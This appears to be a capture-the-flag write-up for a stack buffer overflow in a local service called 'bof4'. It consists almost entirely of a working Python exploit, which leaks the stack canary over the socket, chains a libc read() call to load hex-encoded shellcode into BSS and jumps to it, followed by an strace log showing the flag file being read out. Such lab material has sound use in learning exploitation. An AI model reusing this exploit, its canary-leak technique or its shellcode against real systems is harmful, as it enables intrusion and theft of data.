### exploit

  condition: stack canary/ No NX/ No ASLR/ Remote

```python
#!python
from struct import pack, unpack
from socket import *
import os
import sys

# cat ./secret
sc =
'6a01fe0c246863726574682e2f736589e331c96a0558cd809589eb6a035899b23089e1cd8085c07e0e6a055b89c26a045889e1cd80ebe2'.decode('hex')
SYSTEM = 0xb7e4b260
READ   = 0xb7eea890
BSS    = 0x0804a068

def p32(p):
    return pack('<I', p)

def u32(p):
    return unpack('<I', p)[0]


while 1:
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 31337))
    print s.recv(19)
    s.send('A'*16 + '\n')
    rv = s.recv(1540)
    canary = u32('\x00' + rv[17:20])
    if canary:
        print "Canary: %s" % (hex(canary))
        break
    else:
        print "Couldn't get a canary. Try again.."
    s.close()


s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 31337))
print s.recv(19)
p  = 'A' * 16
p += p32(canary)
p += 'BBBBCCCCDDDD' # dummy
p += p32(READ)
p += p32(BSS)
p += p32(0x5)
p += p32(BSS)
p += p32(len(sc))

s.send(p + '\n')
rv = s.recv(68)
s.send(sc + '\n')
print s.recv(1540)
```



### exploit result

```
[b7fdd424] write(1, "Verbose: connected from 127.0.0."..., 34Verbose: connected
from 127.0.0.1
) = 34
[b7fdd424] clone(child_stack=0,
flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e09968)
= 7829
[b7fdd424] close(5)                     = 0
[b7fdd424] accept(4, Process 7829 attached
 <unfinished ...>
[pid  7829] [b7fdd424] close(4)         = 0
[pid  7829] [b7fdd424] send(5, "What is your name: ", 19, 0) = 19
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7829] [b7fdd424] recv(5, "\n", 1, 0) = 1
[pid  7829] [b7fdd424] send(5,
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x0a\xd5\xba\x19\x00\x99\xe0\xb7\x00\x00\x00\x00\x28\xf5\xff\xbf",
32, 0) = 32
[pid  7829] [b7fdd424] open("/dev/tty", O_RDWR|O_NOCTTY|O_NONBLOCK) = 4
[pid  7829] [b7fdd424] writev(4, [{"*** ", 4}, {"stack smashing detected", 23},
{" ***: ", 6}, {"./bof4", 6}, {" terminated\n", 12}], 5*** stack smashing
detected ***: ./bof4 terminated
) = 51
[pid  7829] [b7fdd424] mmap2(NULL, 4096, PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
[pid  7829] [b7fdd424] rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0
[pid  7829] [b7fdd424] tgkill(7829, 7829, SIGABRT) = 0
[pid  7829] [b7fdd424] --- SIGABRT {si_signo=SIGABRT, si_code=SI_TKILL,
si_pid=7829, si_uid=1000} ---
[pid  7755] [b7fdd424] <... accept resumed> {sa_family=AF_INET,
sin_port=htons(55251), sin_addr=inet_addr("127.0.0.1")}, [16]) = 5
[pid  7755] [b7fdd424] write(1, "Verbose: connected from 127.0.0."...,
34Verbose: connected from 127.0.0.1
) = 34
[pid  7755] [b7fdd424] clone(child_stack=0,
flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e09968)
= 7831
[pid  7755] [b7fdd424] close(5)         = 0
[pid  7755] [b7fdd424] accept(4, Process 7831 attached
 <unfinished ...>
[pid  7831] [b7fdd424] close(4)         = 0
[pid  7831] [b7fdd424] send(5, "What is your name: ", 19, 0) = 19
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "A", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x00", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\xd5", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\xba", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x19", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "B", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "B", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "B", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "B", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "C", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "C", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "C", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "C", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "D", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "D", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "D", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "D", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x90", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\xa8", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\xee", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\xb7", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "h", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\xa0", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x04", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x08", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x05", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x00", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x00", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x00", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "h", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\xa0", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x04", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x08", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "7", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x00", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x00", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\x00", 1, 0) = 1
[pid  7831] [b7fdd424] recv(5, "\n", 1, 0) = 1
[pid  7831] [b7fdd424] send(5,
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\xd5\xba\x19\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"...,
68, 0) = 68
[pid  7831] [b7fdd424] read(5,
"\x6a\x01\xfe\x0c\x24\x68\x63\x72\x65\x74\x68\x2e\x2f\x73\x65\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x95\x89\xeb\x6a\x03\x58\x99\xb2"...,
55) = 55
[pid  7831] [0804a080] open("./secret", O_RDONLY) = 4
[pid  7831] [0804a08d] read(4, "The flag is: b9a971da8b562bed560"..., 48) = 46
[pid  7831] [0804a09d] write(5, "The flag is: b9a971da8b562bed560"..., 46) = 46
[pid  7831] [0804a08d] read(4, "", 48)  = 0
[pid  7831] [0804a09f] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR,
si_addr=0} ---
[pid  7829] [????????] +++ killed by SIGABRT +++
[pid  7831] [????????] +++ killed by SIGSEGV +++
```
